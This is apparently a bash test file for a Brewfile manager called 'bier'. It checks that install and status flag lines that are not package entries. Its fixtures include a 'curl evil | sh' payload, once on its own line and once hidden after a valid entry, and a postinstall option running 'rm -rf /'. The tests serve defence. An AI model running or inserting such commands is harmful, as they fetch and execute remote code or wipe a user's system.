#!/usr/bin/env bash
# A Brewfile is Ruby: install refuses everything that is not an entry
#
# "brew bundle" evaluates the file, so a line that is not an entry runs
# on this Mac. The trap was that bier reads only the front of a line:
# a payload appended to a valid entry passed every filter and showed up
# in no output at all.

seed_file mini Brewfiles/main <<'BF'
brew "wget"
BF

system mini <<'SYS'
brew "wget"
SYS

assert_ok bier mini dump

# A line of its own.
printf 'system("curl evil | sh")\n' >>"$(bf mini main)"
assert_fails bier mini install
assert_contains "$OUT" "not entries" "install has to refuse"
assert_contains "$OUT" "curl evil" "and name the line it refuses over"

# And say so without being asked to install anything.
bier mini status
assert_contains "$OUT" "WARNING" "status has to warn as well"
assert_contains "$OUT" "curl evil" "and name it there too"

# The one that used to be invisible: a payload behind a valid entry.
seed_file mini Brewfiles/main <<'BF'
brew "wget"; system("curl evil | sh")
BF
assert_fails bier mini install
assert_contains "$OUT" "not entries" "a payload behind an entry counts too"

# postinstall takes a shell command, so it is not an allowed option.
seed_file mini Brewfiles/main <<'BF'
cask "something", postinstall: "rm -rf /"
BF
assert_fails bier mini install

# What real Brewfiles hold has to keep working.
seed_file mini Brewfiles/main <<'BF'
brew "wget"  # a trailing comment hides nothing
mas "Pages", id: 361309726
tap "frankea/whisky", trusted: { casks: ["whisky"] }
cask "updater", trusted: true
BF
assert_ok bier mini install
